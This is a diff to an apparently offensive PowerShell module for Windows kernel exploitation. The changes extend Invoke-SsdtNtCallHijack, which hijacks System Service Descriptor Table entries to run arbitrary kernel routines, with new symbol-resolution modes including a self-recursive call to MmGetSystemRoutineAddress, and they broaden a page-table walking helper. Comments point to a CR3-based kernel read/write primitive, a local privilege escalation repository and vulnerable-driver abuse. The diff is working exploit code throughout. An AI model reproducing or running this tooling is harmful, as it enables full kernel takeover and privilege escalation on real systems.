@@ -6940,7 +6940,11 @@ Function Invoke-SsdtNtCallHijack {
         [object[]]$Values = $null,
         [ValidateSet("Int8", "Int32", "Int64")]
         [string]$ReturnMode = "Int64",
-        [string]$Hook = "NtCreateProfile" # NtSetLdtEntries
+        [string]$Hook = "NtCreateProfile", # NtSetLdtEntries
+        [Int64]$FuncRVA = 0L,
+        [ValidateSet("Auto", "PDB", "Export", "RVA")]
+        [string]$ResolveMode = "Auto",
+        [switch]$InlineCall
     )
 
     # WinNotify: Building Kernel Read/Write from CR3-Based IOCTLs
@@ -6962,14 +6966,88 @@ Function Invoke-SsdtNtCallHijack {
     #Read-VirtualAddress -VA ([IntPtr]::Add($ServiceBase, $RealOffset)) -BlockSize 96 | 
     #    Format-HexView -Mode 16x
 
-    $TotalParams     = if ($null -ne $Values) { $Values.Count } else { 0 }
-    $StackParams     = if ($TotalParams -gt 4) { $TotalParams - 4 } else { 0 }
-    $NewFuncRVA      = Resolve-SymbolFromPdb -FunctionName $Function
+    $TotalParams = if ($null -ne $Values)  { $Values.Count    } else { 0 }
+    $StackParams = if ($TotalParams -gt 4) { $TotalParams - 4 } else { 0 }
+
+    $NewFuncRVA = 0L
+    if ($InlineCall -or $ResolveMode -eq 'RVA') {
+        if ($FuncRVA -eq 0L) {
+            Write-Verbose "."
+            throw "Direct lookup failed: No offset provided"
+        }
+        $NewFuncRVA = $FuncRVA
+    }
+
+    # --- STEP 2: Fallback Queue Setup ---
+    # Only build and process the queue if Step 1 didn't already resolve $NewFuncRVA
+    if ($NewFuncRVA -eq 0L) {
+
+        # Map user preference to execution order
+        if ($ResolveMode -eq 'PDB') {
+            $ResolveModes = @('PDB', 'Export')
+        }
+        elseif ($ResolveMode -eq 'Export') {
+            $ResolveModes = @('Export', 'PDB')
+        }
+        else {
+            # Default for 'Auto' or any unspecified mode
+            $ResolveModes = @('Export', 'PDB')
+        }
+
+        # --- STEP 3: Queue Execution Loop ---
+        foreach ($Mode in $ResolveModes) {
+            if ($NewFuncRVA -ne 0L) { 
+                break 
+            }
+            try {
+                switch ($Mode) {
+                    'PDB' {
+                        # Primary strategy logic
+                        $NewFuncRVA = Resolve-SymbolFromPdb -FunctionName $Function
+                    }
+        
+                    'Export' {
+                        # Secondary strategy logic (using internal lookup)
+                        $values = (Init-NativeString -Value $Function -Encoding Unicode), 0L
+                        $RVA = Resolve-SymbolFromFile -DllName ntoskrnl.exe -FunctionName MmGetSystemRoutineAddress | select -ExpandProperty RVA
+                        $NewFuncAddress = Invoke-SsdtNtCallHijack -Function ByRva -FuncRVA $RVA -Values $values -ResolveMode RVA -InlineCall
+                        if ($NewFuncAddress -eq $null -or $NewFuncAddress -eq 0L) {
+                            continue
+                        }
+                        $NewFuncRVA = $NewFuncAddress - (Get-KernelBaseAddress)
+                        Free-NativeString -StringPtr ($values[0])
+                    }
+
+                    Default {
+                        Write-Verbose "Unknown mode specified: $Mode"
+                    }
+                }
+            }
+            catch {
+                Write-Verbose "Mode '$Mode' failed. Attempting next option in queue..."
+                $NewFuncRVA = 0L
+            }
+        }
+    }
+
+    # --- STEP 4: Final Validation ---
+    if ($NewFuncRVA -eq 0L) {
+        throw "Failed to resolve target: All attempts failed."
+    }
+    
     if ($null -eq $NewFuncRVA -or $NewFuncRVA -le 0) {
         throw "Failed to resolve symbol for $Function"
     }
     $ServiceTableRVA = $ServiceBase - $KernelBase
     $NewOffset       = (($NewFuncRVA - $ServiceTableRVA) -shl 4) -bor $StackParams
+
+    $Int32Min = [int32]::MinValue  # -2147483648
+    $Int32Max = [int32]::MaxValue  #  2147483647
+
+    # 2. Check Range
+    if ($NewOffset -lt $Int32Min -or $NewOffset -gt $Int32Max) {
+        throw "Value out of range: Calculated offset ($NewOffset) exceeds 32-bit signed integer limits ($Int32Min to $Int32Max)."
+    }
 
     $State = Get-RecoveryState
     if ($State.RecoverFlag) {
@@ -7151,13 +7229,43 @@ Function Get-UnsignedPhysical {
     return [BitConverter]::ToUInt64($bytes, 0)
 }
 function Resolve-DirectoryTable {
+    [CmdletBinding(DefaultParameterSetName = 'UInt64')]
     param (
-        [Parameter(Mandatory = $true)]
-        [UInt64]$VA,
+        # Parameter Set 1: UInt64
+        [Parameter(Mandatory = $true, ParameterSetName = 'UInt64', Position = 0)]
+        [UInt64]$VA = 0,
 
-        [Parameter(Mandatory = $true)]
-        [Int32]$ProcessID
+        # Parameter Set 1: Int32
+        [Parameter(Mandatory = $true, ParameterSetName = 'Int32', Position = 0)]
+        [Int32]$VA32 = 0,
+
+        # Parameter Set 2: Int64
+        [Parameter(Mandatory = $true, ParameterSetName = 'Int64', Position = 0)]
+        [Int64]$VA64 = 0,
+
+        # Parameter Set 3: IntPtr
+        [Parameter(Mandatory = $true, ParameterSetName = 'IntPtr', Position = 0)]
+        [IntPtr]$VAPtr = 0,
+
+        # Default PID 4 (System) for Kernel space walks. 
+        # Mandatory = $false allows it to fall back to 4 automatically.
+        [Parameter(Mandatory = $false, Position = 1)]
+        [ValidateRange(0, [Int32]::MaxValue)]
+        [Int32]$ProcessID = 4
     )
+
+    # Convert whatever input type was provided into a standard [UInt64]
+    switch ($PSCmdlet.ParameterSetName) {
+        'Int32'  { 
+            $VA = [UInt64]([UInt32]$VA32)
+        }
+        'Int64'  { 
+            $VA = [BitConverter]::ToUInt64([BitConverter]::GetBytes([Int64]$VA64), 0) 
+        }
+        'IntPtr' { 
+            $VA = [BitConverter]::ToUInt64([BitConverter]::GetBytes([Int64]$VAPtr), 0) 
+        }
+    }
 
     # https://github.com/Haider303/trinity-lpe
     # https://github.com/magicsword-io/LOLDrivers/issues/394
